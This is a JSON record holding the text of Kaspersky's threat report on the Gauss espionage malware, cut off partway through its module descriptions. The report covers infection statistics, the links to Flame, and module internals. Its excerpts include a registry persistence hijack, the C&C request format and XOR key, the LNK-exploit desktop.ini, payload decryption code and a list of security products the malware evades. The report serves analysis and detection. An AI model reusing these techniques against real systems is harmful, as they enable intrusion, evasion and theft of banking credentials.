{
    "id": "12768c30-9184-487a-a89e-406e1ce7f073",
    "created_at": "2022-10-25T16:48:22.318248Z",
    "updated_at": "2025-03-27T02:05:38.297409Z",
    "deleted_at": null,
    "sha1_hash": "4c9c37199b1e1da37d0dae56f7a6469e0b0a4c6e",
    "title": "Gauss: Abnormal Distribution",
    "authors": "Kaspersky",
    "file_creation_date": "2012-08-09T18:14:41Z",
    "file_modification_date": "2012-08-09T18:14:43Z",
    "file_size": 1556206,
    "plain_text": "# Gauss:\n## Abnormal Distribution\n\n\n### Kaspersky Lab Global Research and Analysis Team\n\n\n-----\n\n### Contents\n\n#### Introduction\b 3 Executive Summary\b 4 Infection stats\b 5 Operating System Statistics\b 7 Architecture\b 8 Comparison with Flame\b 10 Wmiqry32/Wmihlp32.dll aka ShellHW\b 12 Installation\b 12 Operation \b 12 Dskapi.ocx\b 18 USB Payload\b 21 thumbs.db file\b 22 Smdk.ocx\b 24 McDmn.ocx\b 26 Lanhlp32.ocx\b 27 Devwiz.ocx\b 29 Winshell.ocx\b 31 Windig.ocx\b 37 Gauss C&C Information\b 39 Gauss C2 Domains Overview:\b 44 DNS Balancing\b 45\n\n Timeline\b 46 Files list\b 47 Conclusion\b 49\n\n\n-----\n\n### Introduction\n\nWhile analyzing the Flame malware that we detected in May 2012, Kaspersky Lab experts identified some distinguishing\n\nfeatures of Flame’s modules. Based on those features, we discovered that in 2009, the first variant of the Stuxnet worm\n\nincluded a module that was created based on the Flame platform. This indicates that there was some form of collaboration\n\nbetween the groups that developed the Flame and Tilded (Stuxnet/Duqu) platforms.\n\nBased on the results of a detailed analysis of Flame, we continued to actively search for new, unknown components. A more\n\nin-depth analysis conducted in June 2012 resulted in the discovery of a new, previously unknown malware platform that\n\nuses a modular structure resembling that of Flame, a similar code base and system for communicating to C&C servers, as\n\nwell as numerous other similarities to Flame.\n\nIn our opinion, all of this clearly indicates that the new platform which we discovered and which we called “Gauss,” is\n\nanother example of a cyber-espionage toolkit based on the Flame platform.\n\nGauss is a project developed in 2011-2012 along the same lines as the Flame project. The malware has been actively\n\ndistributed in the Middle East for at least the past 10 months. The largest number of Gauss infections has been recorded in\n\nLebanon, in contrast to Flame, which spread primarily in Iran.\n\nFunctionally, Gauss is designed to collect as much information about infected systems as possible, as well as to steal\n\ncredentials for various banking systems and social network, email and IM accounts. The Gauss code includes commands to\n\nintercept data required to work with several Lebanese banks – for instance, Bank of Beirut, Byblos Bank, and Fransabank.\n\nCuriously, several Gauss modules are named after famous mathematicians. The platform includes modules that go by the\n\nnames “Gauss”, “Lagrange”, “Godel”, “Tailor”, “Kurt” (in an apparent reference to Godel). The Gauss module is responsible\n\nfor collecting the most critical information, which is why we decided to name the entire toolkit after it.\n\nGauss is a much more widespread threat than Flame. However, we have found no self-replication functionality in the\n\nmodules that we have seen to date, which leaves open the question of its original attack vector.\n\n\n-----\n\n### Executive Summary\n\nThe first known Gauss infections date back to September-October 2011. During that period, the Gauss authors modified\n\ndifferent modules multiple times. They also changed command server addresses. In the middle of July 2012, when we had\n\nalready discovered Gauss and were studying it, the command servers went offline.\n\nGauss is designed to collect information and send the data collected to its command-and-control servers. Information is\n\ncollected using various modules, each of which has its own unique functionality:\n\n  - Injecting its own modules into different browsers in order to intercept user sessions and steal passwords,\n\ncookies and browser history.\n\n  - Collecting information about the computer’s network connections.\n\n  - Collecting information about processes and folders.\n\n  - Collecting information about BIOS, CMOS RAM.\n\n  - Collecting information about local, network and removable drives.\n\n  - Infecting USB drives with a spy module in order to steal information from other computers.\n\n  - Installing the custom Palida Narrow font (purpose unknown).\n\n  - Ensuring the entire toolkit’s loading and operation.\n\n  - Interacting with the command and control server, sending the information collected to it,\n\ndownloading additional modules.\n\nThe spy module that works on USB drives uses an .LNK exploit for the CVE-2010-2568 (http://web.nvd.nist.gov/view/\n\nvuln/detail?vulnId=CVE-2010-2568) vulnerability. The exploit is similar to the one used in the Stuxnet worm, but it is\n\nmore effective. The module masks the Trojan’s files on the USB drive without using a driver. It does not infect the system:\n\ninformation is extracted from it using a spy module (32- or 64-bit) and saved on the USB drive.\n\n\n-----\n\n### Infection stats\n\nWe began our investigation into Gauss in early June 2012. Based on data obtained through the Kaspersky Security Network,\n\nwe noticed right away that the Trojan appeared to be widely distributed in three particular countries in the Middle East.\n\nFurther observation later confirmed this three-country concentration. As of 31 July 2012, we’ve counted around 2500\n\nunique PCs on which files from the Gauss collection have been found.\n\n_Most infected countries_\n\nThe highest number of infections is recorded in Lebanon, with more than 1600 computers affected. The Gauss code\n\n(winshell.ocx) contains direct commands to intercept data required to work with Lebanese banks – including the Bank of\n\nBeirut, Byblos Bank and Fransabank.\n\nIn Israel and the Palestinian Territory, 750 incidents have been recorded.\n\nUnique users\n\nLebanon 1660\n\nIsrael 483\n\nPalestinian Territory 261\n\nUnited States 43\n\nUnited Arab Emirates 11\n\nGermany 5\n\nEgypt 4\n\nQatar 4\n\nJordan 4\n\nSaudi Arabia 4\n\nSyria 4\n\n_Top 10 infected countries_\n\n|Col1|Unique users|\n|---|---|\n|Lebanon|1660|\n|Israel|483|\n|Palestinian Territory|261|\n|United States|43|\n|United Arab Emirates|11|\n|Germany|5|\n|Egypt|4|\n|Qatar|4|\n|Jordan|4|\n|Saudi Arabia|4|\n|Syria|4|\n\n\n-----\n\nAs can be seen in the above table, with the exceptions of the USA and Germany, all incidents took place in the Middle East.\n\nHowever, we believe that in the majority of cases linked to the USA and Germany the affected users were actually in the\n\nMiddle East too - using VPNs (or the Tor anonymity network).\n\nIn all, we’ve recorded incidents in 25 countries around the world; however, in all the countries outside the top 10 only one or\n\ntwo incidents have been recorded:\n\n_Total infected users_\n\nRegarding the spreading mechanism used by Gauss, the obtained data leave us with more questions unanswered than\n\nsolved. The overall number of infections (around 2500) that we’ve detected could in reality just be a small portion of tens of\n\nthousands of infections, since our statistics only cover users of Kaspersky Lab products.\n\n\n-----\n\nWhen we compare the number of Gauss infections with those of other programs discovered earlier that have either common\n\ncomponents or structures, we get the following figures:\n\nName Incidents (KL stats) Incidents (approx.)\n\nStuxnet More than 100 000 More than 300 000\n\nGauss ~ 2500 ?\n\nFlame ~ 700 ~5000-6000\n\nDuqu ~20 ~50-60\n\nGauss has been spreading in the region for at least 10 months, in the course of which it has infected thousands of systems.\n\nOn one hand, this is an uncharacteristically high number for targeted attacks similar to Duqu (it’s possible that such a high\n\nnumber of incidents is due to the presence of a worm in one of the Gauss modules that we still don’t know about). However,\n\nthe infections have been predominantly within the boundaries of a rather small geographical region. If the malware had the\n\nability to spread indiscriminately – for example, on USB sticks as was the case with Stuxnet – infections would have been\n\ndetected in much greater numbers in other countries.\n\n### Operating System Statistics\n\nGauss was designed for 32-bit versions of the Windows operating system. Some of the modules do not work under Windows\n\n7 SP1.\n\nOS % from total\n\nWindows 7 34.87\n\nXP Professional SP2 26.40\n\nXP Professional SP3 17.92\n\nWindows 7 SP1 10.77\n\nWindows 7 Home 2.15\n\nVista Home SP1 1.71\n\nVista Home 1.22\n\nWindows 7 Home SP1 0.88\n\nVista Home SP2 0.83\n\nVista 0.64\n\nVista SP2 0.39\n\nXP Home Edition 0.39\n\nVista SP1 0.34\n\nOther 1.47\n\nThere is a separate spy module that operates on USB drives (see description of dskapi.ocx) and is designed to collect\n\ninformation from 64-bit systems.\n\n|Name|Incidents (KL stats)|Incidents (approx.)|\n|---|---|---|\n|Stuxnet|More than 100 000|More than 300 000|\n|Gauss|~ 2500|?|\n|Flame|~ 700|~5000-6000|\n|Duqu|~20|~50-60|\n\n|OS|% from total|\n|---|---|\n|Windows 7|34.87|\n|XP Professional SP2|26.40|\n|XP Professional SP3|17.92|\n|Windows 7 SP1|10.77|\n|Windows 7 Home|2.15|\n|Vista Home SP1|1.71|\n|Vista Home|1.22|\n|Windows 7 Home SP1|0.88|\n|Vista Home SP2|0.83|\n|Vista|0.64|\n|Vista SP2|0.39|\n|XP Home Edition|0.39|\n|Vista SP1|0.34|\n|Other|1.47|\n\n\n-----\n\n### Architecture\n\nGauss is a modular system. The number and combination of modules may change from one infected system to another. In\n\nthe course of our research, we discovered the following modules:\n\nModule name Location Description\n\nCosmos %system32%\\devwiz.ocx Collects information about CMOS, BIOS\n\nKurt, Godel %system32%\\dskapi.ocx Infects USB drives with data-stealing module\n\nTailor %system32%\\lanhlp32.ocx Collects information about network interfaces\n\nMcDomain %system32%\\mcdmn.ocx Collects information about user’s domain\n\nUsbDir %system32%\\smdk.ocx Collects information about computer’s drives\n\nLagrange %system32%\\windig.ocx Installs a custom “Palida Narrow” font\n\nGauss %system32%\\winshell.ocx Installs browser plugins that collect passwords and cookies\n\n%system32%\\wbem\\wmiqry32.ocx\nShellHW Main loader and communication module\n%system32%\\wbem\\wmihlp32.ocx\n\nThe configuration of a specific combination of modules for each system is described in a special registry key. This technique,\n\nas well as the configuration structure itself, is similar to that used in Stuxnet/Duqu (storing of the configuration in the\n\nWindows registry) and Flame (configuration structure). Flame stores its configuration in the main module (mssecmgr.ocx).\n\nWe created a special detection routine which helped us to discover various Gauss configurations based on registry\n\nsettings on infected machines. We detected about 1700 such configurations in total, which revealed a picture of modules\n\npropagation:\n\nNumber of PC with the module\nModule\n(defined in config)\n\nUsbDir 1655\n\nGodel 1220\n\nGauss 858\n\nGauss_1.1 510\n\nKurt (aka Godel) 433\n\nGauss 1.0.8 318\n\nTailor 28\n\nMcDomain 1.2 5\n\nCosmos 5\n\nLagrange 3\n\nYou can see three main modules, which are used in most cases – Gauss, Godel and UsbDir.\n\n|Module name|Location|Description|\n|---|---|---|\n|Cosmos|%system32%\\devwiz.ocx|Collects information about CMOS, BIOS|\n|Kurt, Godel|%system32%\\dskapi.ocx|Infects USB drives with data-stealing module|\n|Tailor|%system32%\\lanhlp32.ocx|Collects information about network interfaces|\n|McDomain|%system32%\\mcdmn.ocx|Collects information about user’s domain|\n|UsbDir|%system32%\\smdk.ocx|Collects information about computer’s drives|\n|Lagrange|%system32%\\windig.ocx|Installs a custom “Palida Narrow” font|\n|Gauss|%system32%\\winshell.ocx|Installs browser plugins that collect passwords and cookies|\n|ShellHW|%system32%\\wbem\\wmiqry32.ocx %system32%\\wbem\\wmihlp32.ocx|Main loader and communication module|\n\n|Module|Number of PC with the module (defined in config)|\n|---|---|\n|UsbDir|1655|\n|Godel|1220|\n|Gauss|858|\n|Gauss_1.1|510|\n|Kurt (aka Godel)|433|\n|Gauss 1.0.8|318|\n|Tailor|28|\n|McDomain 1.2|5|\n|Cosmos|5|\n|Lagrange|3|\n\n\n-----\n\nSome examples of different configs:\n\nCosmos Cosmos Godel Godel Gauss\nGauss Gauss 1.0.8 Gauss 1.0.8 Lagrange Kurt\nMcDomain 1.2 Godel Tailor UsbDir\nUsbDir McDomain 1.2 UsdDir\n\nTailor\nUsbDir\n\nAs mentioned above, we have been unable to discover the original infection vector and the dropper file that installs Gauss in\n\nthe system. In all the systems we have studied, we dealt with a set of modules that was already installed. It is possible that\n\nduring initial infection, only the ShellHW component is installed, which then installs the other modules.\n\nShellHW (file name “wmiqry32.dll”/”wmihlp32.dll”) is the main component of the malware which ensures that all other\n\nGauss modules are loaded when the malware starts and operate correctly.\n\n|Cosmos Gauss McDomain 1.2 UsbDir|Cosmos Gauss 1.0.8 Godel McDomain 1.2 Tailor UsbDir|Godel Gauss 1.0.8|Godel Lagrange Tailor UsdDir|Gauss Kurt UsbDir|\n|---|---|---|---|---|\n\n\n-----\n\n### Comparison with Flame\n\nAs we mentioned above, there are significant similarities in code and architecture between Gauss and Flame. In fact, it is\n\nlargely due to these similarities that Gauss was discovered. We created the following table for a clearer understanding of\n\nthese facts and proof of ‘kinship’ between the two attack platforms:\n\nFeature Flame Gauss\n\nModular architecture Yes Yes\n\nUsing kernel drivers No No\n\n.OCX files extensions Yes Yes\n\nConfiguration settings Predefined in main body Stored in registry\n\nDLL injections Yes Yes\n\nVisual C++ Yes Yes\n\nEncryption methods XOR XOR\n\nUsing USB as storage Yes (hub001.dat) Yes (.thumbs.db)\n\nEmbedded LUA scripting Yes No\n\nBrowser history/cookies stealer Yes (soapr32/nteps32) Yes (winshell)\n\nCVE2010-2568 (.LNK exploit) Yes (target.lnk) Yes (target.lnk)\n\nC&C communication https https\n\nLog files/stolen data stored in %temp% Yes Yes\n\nZlib compression of collected data Yes Yes\n\nIn addition to the features listed above, there are considerable similarities in the operation of the Flame and Gauss C&C\n\nservers. The relevant analysis is provided in the C&C Communication section.\n\nThere are more similarities in the code and data of the modules:\n\n  - C++ runtime type information (RTTI) structures are encoded to hide the names of the standard library classes. The\n\nsame encoded names can be found in both Flame and Gauss modules, i.e. the first RTTI structure contains name\n\n“AVnxsys_uwip” that most likely belongs to the “AVtype_info” class.\n\n|Feature|Flame|Gauss|\n|---|---|---|\n|Modular architecture|Yes|Yes|\n|Using kernel drivers|No|No|\n|.OCX files extensions|Yes|Yes|\n|Configuration settings|Predefined in main body|Stored in registry|\n|DLL injections|Yes|Yes|\n|Visual C++|Yes|Yes|\n|Encryption methods|XOR|XOR|\n|Using USB as storage|Yes (hub001.dat)|Yes (.thumbs.db)|\n|Embedded LUA scripting|Yes|No|\n|Browser history/cookies stealer|Yes (soapr32/nteps32)|Yes (winshell)|\n|CVE2010-2568 (.LNK exploit)|Yes (target.lnk)|Yes (target.lnk)|\n|C&C communication|https|https|\n|Log files/stolen data stored in %temp%|Yes|Yes|\n|Zlib compression of collected data|Yes|Yes|\n\n|Col1|Col2|\n|---|---|\n|rpcns4.ocx Flame module: “Flask”|winshell.ocx Gauss module: “Gauss”|\n\n\n-----\n\n- Most of Flame and Gauss modules contain dozens of object initialization functions that construct string objects\n\nfrom encrypted data. The layout of these functions is almost identical.\n\n_mssecmgr.ocx_ _wmiqry32.dll, wmihlp32.dll_\n_Flame main module_ _Gauss main module_\n\n- String decryption routines (“GetDecryptedStrings” used in initialization functions) are very similar, although not\n\nidentical, because the layout of the structures holding encrypted strings was changed.\n\n|Col1|Col2|\n|---|---|\n|mssecmgr.ocx Flame main module|wmiqry32.dll, wmihlp32.dll Gauss main module|\n\n|Col1|Col2|\n|---|---|\n|mssecmgr.ocx Flame main module|wmiqry32.dll, wmihlp32.dll Gauss main module|\n\n\n-----\n\n### Wmiqry32/Wmihlp32.dll aka ShellHW\n\nInstalled by: Unknown dropper\n\nOperates in two modes: installation and normal operation.\n\nFile names %system32%\\wbem\\wmiqry32.dll\n%system32%\\wbem\\wmihlp32.dll\n\nSome known MD5 C3B8AD4ECA93114947C777B19D3C6059\n08D7DDB11E16B86544E0C3E677A60E10\n055AE6B8070DF0B3521D78E1B8D2FCE4\nFA54A8D31E1434539FBB9A412F4D32FF\n01567CA73862056304BB87CBF797B899\n23D956C297C67D94F591FCB574D9325F\n\nImage Size 258 048 bytes\n\nNumber of resources 7\n\nResources 121, 131, 141, 151, 161, 171, 181\n\nDate of compilation Jun 1 2011\nJul 16 2011\nJul 18 2011\nSep 28 2011\nOct 20 2011\n\nRelated files %temp%\\~shw.tmp\n%temp%\\~stm.tmp\n\n### Installation\n\nThe module checks if it was loaded by “lsass.exe” process and, if true, proceeds with the installation.\n\nIt writes itself in files: %system32%\\wbem\\wmiqry32.dll, %system32%\\wbem\\wmihlp32.dll and modifies the\n\nsystem registry to be loaded instead of %system32%\\wbem\\wbemsvc.dll file.\n\nTo achieve this, it writes the following registry value:\n\n|File names|%system32%\\wbem\\wmiqry32.dll %system32%\\wbem\\wmihlp32.dll|\n|---|---|\n|Some known MD5|C3B8AD4ECA93114947C777B19D3C6059 08D7DDB11E16B86544E0C3E677A60E10 055AE6B8070DF0B3521D78E1B8D2FCE4 FA54A8D31E1434539FBB9A412F4D32FF 01567CA73862056304BB87CBF797B899 23D956C297C67D94F591FCB574D9325F|\n|Image Size|258 048 bytes|\n|Number of resources|7|\n|Resources|121, 131, 141, 151, 161, 171, 181|\n|Date of compilation|Jun 1 2011 Jul 16 2011 Jul 18 2011 Sep 28 2011 Oct 20 2011|\n|Related files|%temp%\\~shw.tmp %temp%\\~stm.tmp|\n\n```\n[HKCR\\CLSID\\{7C857801-7381-11CF-884D-00AA004B2E24}\\InProcServer32]\nDefault = %system32%\\wbem\\wmihlp32.dll\n\n```\n\n### Operation\n\nThe module is automatically loaded into processes that use wbemsvc.dll. When loaded in “svchost.exe” that was started\n\nwith “-k netsvc” parameter, it starts its main thread.\n\nThe module creates “ShellHWStop”, “Global\\ShellHWDetectionEvent” events, mutex “ShellHWDetectionMutex”.\n\n\n-----\n\nThe main thread exits if the following processes were found at its start:\n\n\n-----\n\nThe module reads the registry value “SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Reliability” “TimeStampForUI”. It is an\n\nencrypted configuration file. The configuration file contains the list of additional modules, their names, DLL exports names to\n\ncall and location of the modules’ additional files.\n\n```\nGauss\nShellNotifyUser\nShellNotifyUserEx\nSetWindowEvent\nInitShellEx\n%systemroot%\\system32\\winshell.ocx\n%temp%\\ws1bin.dat\nGodel\nInitCache\nRevertCache\nValidateEntry\nCreateEntry\n%windir%\\system32\\dskapi.ocx\n%temp%\\~gdl.tmp\nUsbDir\nInitCache\nRevertCache\nValidateEntry\nCreateEntry\n%windir%\\system32\\smdk.ocx\n%temp%\\~mdk.tmp\n\n```\n\n_String values from config file (example)_\n\n\n-----\n\nEvery module is loaded and its export functions are called as specified in the configuration. Most of the actions are logged in\n\nan encrypted (with XOR) file “%temp%\\~shw.tmp”.\n\n##### Sample of decrypted “~shw.tmp”\n\nAfter loading additional modules, it tries to acquire the same privileges as “explorer.exe” and then starts its C&C interaction\n\nloop.\n\nPrior to communicating with the C&C, all the information from the other modules’ log files is copied to the ~shw.tmp file.\n\nPaths to the log files are taken from the TimeStampForUI configuration file. As a result, at this stage ~shw.tmp becomes a\n\nuniversal container file containing all the stolen data.\n\nIt checks Internet connection (https) by accessing URLs specified in its resource 161.\n\n[It then checks an https connection with www.google.com or www.update.windows.com. If “200 OK” is received in reply, it](http://www.google.com)\n\nsends a request with the proxy server parameters taken from the prefs.js file of the Mozilla Firefox browser.\n\n\n-----\n\nWhen an Internet connection is available, it connects to its C&C servers that are specified in resource 131:\n\nConnection is established using WinInet API and is performed in two stages:\n\n1. GET request to the server. The response from the server is expected to contain new modules, commands or\n\nconfiguration data.\n```\n    GET [C&C domain]/userhome.php?sid=[random string]==&uid=VfHx8fHx8fHx8fHx8f\n    Hx8fHx8fE=\n\n```\n2. POST request to the server with the contents of the file “~shw.tmp” that contains all data\n\ncollected from the infected computer.\n\nThe response from the server is decrypted using XOR and 0xACDC as the key. Exfiltrated data is compressed with Zlib.\n\nThe C&C connection routine is controlled by a DWORD value that is read from the registry value:\n\n```\n[HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Reliability]\nShutdownIntervalSnapshotUI\n\n```\n\nThe initial value of the counter is read from resource 181 and is equal to 56. The counter is decremented every time the\n\nmodule fails to connect to its C&C server or to the servers specified in resource 161 and it is reset to the initial value after\n\nevery successful connection to the C&C server. The module exits the C&C connection loop when the value of the counter\n\nbecomes equal to zero.\n\n|Resource|Description|\n|---|---|\n|121|3 DWORDs, related to list of AVs|\n|131|Hostnames and URLs of C&C servers|\n|141|List of AVs, firewalls, etc.|\n|151|Additional configuration DWORDs|\n|161|Hostnames and URLs of legitimate sites to check Internet connection|\n|171|String with cryptic identifiers|\n|181|DWORD, number of attempts to connect to the C&C before giving up|\n\n\n-----\n\n```\nFile Version:    2001.12.4414.320\nProduct Version:  5.1.2600.5788\nFile OS:      WINDOWS32\nFile Type:     DLL\nFile SubType:    UNKNOWN\nLanguage/Code Page: 1033/1200\nCompanyName:    Microsoft Corporation\nFileDescription:  WMI COM Helper\nFileVersion:    2001.12.4414.320\nLegalCopyright:   Copyright (C) Microsoft Corp. 1995-1999\nLegalTrademarks:  Microsoft(R) is a registered trademark of\n          Microsoft Corporation. Windows(TM) is a trade\n          mark of Microsoft Corporation\nProductName:    WMI COM Services Help\nProductVersion:   05.01.2600.5788\n\n```\n\n_Version info “wmiqry32.dll”_\n\n\n-----\n\n### Dskapi.ocx\n\nName of the module used in Gauss: “Godel” or “Kurt”.\n\nFile names %system32%\\dskapi.ocx\n\nSome known MD5 ED5559B0C554055380D75C1D7F9C4424\nE379270F53BA148D333134011AA3600C\nEF83394D9600F6D2808E0E99B5F932CA\n\nImage Size 1 327 104 bytes\n954 368 bytes\n962 560 bytes\n417 792 bytes\n\nNumber of resources 2\n\nResources 100, 101\n\nDate of compilation 28.09.2011\n13.10.2011\n01.11.2011\n29.11.2011\n\nRelated files %temp%\\~gdl.tmp\n.thumbs.db\nwabdat.dat\ndesktop.ini\ntarget.lnk\nSystem32.dat\nSystem32.bin\n.CatRoot.tmp\n\nCreates events: “{12258790-A76B}”, “Global\\RasSrvReady”\n\nAll functionality is implemented in “RevertCache” export. The module starts its main thread and then returns. The main\n\nthread waits for the “{12258790-A76B}” event and continuously checks for the presence of anti-malware software.\n\n“ValidateEntry” signals the “{12258790-A76B}” event, allowing for the main thread to work for 3 seconds before terminating\n\nit.\n\nWrites log file: %temp%\\~gdl.tmp\n\nThe log file entries are compressed with Zlib.\n\nReads registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n\n|File names|%system32%\\dskapi.ocx|\n|---|---|\n|Some known MD5|ED5559B0C554055380D75C1D7F9C4424 E379270F53BA148D333134011AA3600C EF83394D9600F6D2808E0E99B5F932CA|\n|Image Size|1 327 104 bytes 954 368 bytes 962 560 bytes 417 792 bytes|\n|Number of resources|2|\n|Resources|100, 101|\n|Date of compilation|28.09.2011 13.10.2011 01.11.2011 29.11.2011|\n|Related files|%temp%\\~gdl.tmp .thumbs.db wabdat.dat desktop.ini target.lnk System32.dat System32.bin .CatRoot.tmp|\n\n\n-----\n\nChecks for running anti-malware products by names and exits if they are present:\n\n\nAVKProxy.exe\n\nAVKService.exe\n\nAVKTray.exe\n\nAVKWCtl.exe\n\nGDFirewallTray.exe\n\nGDFwSvc.exe\n\nGDScan.exe\n\n\nabcd.exe\n\navp.exe\n\nfameh32.exe\n\nfch32.exe\n\nfsar32.exe\n\nfsav32.exe\n\nfsdfwd.exe\n\n\nfsgk32.exe\n\nfsgk32st.exe\n\nfsguidll.exe\n\nfshdll32.exe\n\nfsm32.exe\n\nfsma32.exe\n\nfsmb32.exe\n\n\nfsorsp.exe\n\nfspc.exe\n\nfsqh.exe\n\nfssm32.exe\n\nfsus.exe\n\ngsava.exe\n\ngssm32.exe\n\n\nvsmon.exe\n\nzapro.exe\n\nzlclient.exe\n\n\nIt also exits if started on Windows 7 SP 1.\n\nBy querying disk enum in registry, it also tries to identify whether the storage is USB-connected or not by searching\n\n“USBSTOR” string in their information.\n\nWhen a drive contains “.thumbs.db” file, its contents are read and checked for the valid magic number 0xEB397F2B. If it\n\nmatches, the module creates %commonprogramfiles%\\system\\wabdat.dat and writes the data to this file, and then deletes\n\n“.thumbs.db”.\n\nThen, it infects the USB drives by creating directories with the names .Backup0[D-M] and .Backup00[D-M]\n\n_Infected USB root folder (before activation)_\n\n\n-----\n\nEach directory contains a specially crafted desktop.ini file and target.lnk file that exploits the LNK vulnerability.\n\n_target.lnk_\n\n```\n[.ShellClassInfo]\nCLSID = {0AFACED1-E828-11D1-9187-B532F1E9575D}\nCLSID2 = {0AFACED1-E828-11D1-9187-B532F1E9575D}\nUICLSID = {0AFACED1-E828-11D1-9187-B532F1E9575D}\n\n```\n\n_desktop.ini_\n\n_Listing of .Backup0* directory_\n\nIn the root directory of the drive it creates files “System32.dat” and “System32.bin”, the payload DLLs, and the “.thumbs.db”\n\nfile. The payloads are stored as resources and encrypted with a simple XOR routine.\n\n```\nstatic int decrypt(uint8_t *data, unsigned int dataLen)\n{\n    uint32_t acc = 0xCC;\n    for ( unsigned int i = 0; i < dataLen; i++ )\n    {\n       uint8_t acc2 = data[i];\n       data[i] ^= acc;\n       acc = acc2;\n    }\n    return 0;\n}\n\n```\n\n-----\n\n|Resource|File name|Description|\n|---|---|---|\n|100|System32.dat (.CatRoot.tmp)|32-bit payload|\n|101|System32.bin (.CatRoot.tmp)|64-bit payload|\n\n\n### USB Payload\n\nBoth 32-bit and 64-bit DLLs implement the same functionality. When loaded using the LNK vulnerability, they start a main\n\nthread and return. The main thread copies the payload to %TEMP% directory and loads itself again. When loaded from\n\n%TEMP%, it creates a mutex “Isvp4003ltrEvent”, patches the “NtQueryDirectoryFile” function in ntdll.dll so that it hides its\n\nfiles and then sends the “F5” key event to windows of classes “SysListView32”, “SysTreeView32”, “DirectUIHWND”, causing\n\nExplorer directory listings to refresh. This hides the files. It also waits for the event “Global\\RasSrvReady”.\n\nThen, it retrieves the following data from the system:\n\n  - Version of the Windows OS\n\n  - Workstation info\n\n  - Network adapter information\n\n  - Routing table\n\n  - Process list\n\n  - Environment variables and disk information\n\n  - List of visible network shares\n\n  - Network proxy information\n\n  - List of visible MS SQL servers\n\n  - URL cache\n\nAll this information is encoded and appended to the file “.thumbs.db” on the infected storage. This file also contains a TTL\n\n(time to live) value that is decremented by 1 each time the payload starts from the infected storage. When this counter\n\nbecomes equal to zero, the payload disinfects the media by removing “.Backup0*” directories and “System32.dat” and\n\n“System32.bin” files, leaving “.thumbs.db” file with collected information. Known value of the TTL value is “30.”\n\nThere are several “special” versions of the payload. They contain additional PE sections with names “.exsdat,” “.exrdat,” and\n\n“.exdat”. These sections are encrypted with RC4. The encryption key is derived from an MD5 hash performed 10000 times\n\non a combination of “%PATH%” environment string and name of the directory in %PROGRAMFILES%.\n\nThe RC4 key is not yet known, neither is the contents of these sections. The payload also contains a binary resource 100\n\nthat is also encrypted.\n\n\n-----\n\n### thumbs.db file\n\nThis is a container for data stolen by the “dskapi” payload.\n\nOffset Data\n\n0 Magic number : 0xEB397F2B\n\n4 TTL counter\n\n… Encoded data\n\nThe encoded data consists of arrays of encoded strings, separated by a magic value 0xFF875686.\n\nOffset Description\n\n0 Magic number :\n0xFF875686 – end of array of records, must search for the next Magic\n0xFF875683 XOR ( recordLength + 5 ) – start of record\n\n4 Encrypted string data, recordLength bytes\n\nEvery record is encrypted by a simple algorithm using the character’s position and record length and can be decrypted with\n\nthe following code:\n\n|Offset|Data|\n|---|---|\n|0|Magic number : 0xEB397F2B|\n|4|TTL counter|\n|…|Encoded data|\n\n|Offset|Description|\n|---|---|\n|0|Magic number : 0xFF875686 – end of array of records, must search for the next Magic 0xFF875683 XOR ( recordLength + 5 ) – start of record|\n|4|Encrypted string data, recordLength bytes|\n\n```\nfor ( unsigned int j = 0; j < recordLen; j++ )\n           {\n              ptr[i + j] ^= recordLen;\n              ptr[i + j] -= j;\n           }\n\n```\n```\nFile Version:    5.1.3700.0\nProduct Version:  5.1.3700.0\nFile OS:      NT (WINDOWS32)\nFile Type:     DRV\nFile SubType:    DRV SOUND\nFile Date:     00:00:00 00/00/0000\nLanguage/Code Page: 1033/1200\nCompanyName:    Microsoft Corporation\nFileDescription:  Disk Helper\nFileVersion:    5.1.3700.0\nInternalName:    dskapi.ocx\nLegalCopyright:   © Microsoft Corporation. All rights reserved.\nOriginalFilename:  dskapi.ocx\nProductName:    Microsoft® Windows® Operating System\nProductVersion:   5.1.3700.0\n\n```\n\n_Version info “dskapi.ocx”_\n\n\n-----\n\n### Smdk.ocx\n\nName of the module used in Gauss: “UsbDir”\n```\n     File names %system32%\\smdk.ocx\n     Some known MD5 5604A86CE596A239DD5B232AE32E02C6\n                   90F5C45420C295C73067AF44028CE0DD\n     Image Size 212 992 bytes\n     Date of compilation 27.09.2011\n                   17.10.2011\n\n```\nRelated files `%temp%\\~mdk.tmp`\n\nCreates events: “{B336C220-B158}”, “Global\\SmSrvReady”\n\nAll functionality is implemented in “RevertCache” export. The module starts its main thread and then returns. The main\n\nthread waits for the “{B336C220-B158}” event and continuously checks for the presence of anti-malware software.\n\n“ValidateEntry” signals the “{B336C220-B158}” event, allowing for the disk enumeration routine to start.\n\nWrites log file: %temp%\\~mdk.tmp\n\nReads registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n\nChecks for running antimalware products by names and exits if they are present:\n\n|File names|%system32%\\smdk.ocx|\n|---|---|\n|Some known MD5|5604A86CE596A239DD5B232AE32E02C6 90F5C45420C295C73067AF44028CE0DD|\n|Image Size|212 992 bytes|\n|Date of compilation|27.09.2011 17.10.2011|\n|Related files|%temp%\\~mdk.tmp|\n\n\nAVKProxy.exe\n\nAVKService.exe\n\nAVKTray.exe\n\nAVKWCtl.exe\n\nGDFirewallTray.exe\n\nGDFwSvc.exe\n\nGDScan.exe\n\n\nabcd.exe\n\navp.exe\n\nfameh32.exe\n\nfch32.exe\n\nfsar32.exe\n\nfsav32.exe\n\nfsdfwd.exe\n\n\nfsgk32.exe\n\nfsgk32st.exe\n\nfsguidll.exe\n\nfshdll32.exe\n\nfsm32.exe\n\nfsma32.exe\n\nfsmb32.exe\n\n\nfsorsp.exe\n\nfspc.exe\n\nfsqh.exe\n\nfssm32.exe\n\nfsus.exe\n\ngsava.exe\n\ngssm32.exe\n\n\nThe version of the module built on 27.09.2011 also exits if started on Windows 7 SP 1.\n\nBy querying disk enum in registry, it also tries to identify whether the storage is USB-connected or not by searching\n\n“USBSTOR” string in their information.\n\nThe log file entries are compressed with Zlib.\n\n\n-----\n\n```\nFile Version:    5.1.3700.0\nProduct Version:  5.1.3700.0\nFile OS:      NT (WINDOWS32)\nFile Type:     DRV\nFile SubType:    DRV SOUND\nFile Date:     00:00:00 00/00/0000\nLanguage/Code Page: 1033/1200\nCompanyName:    Microsoft Corporation\nFileDescription:  Disk Helper\nFileVersion:    5.1.3700.0\nInternalName:    dskapi.ocx\nLegalCopyright:   © Microsoft Corporation. All rights reserved.\nOriginalFilename:  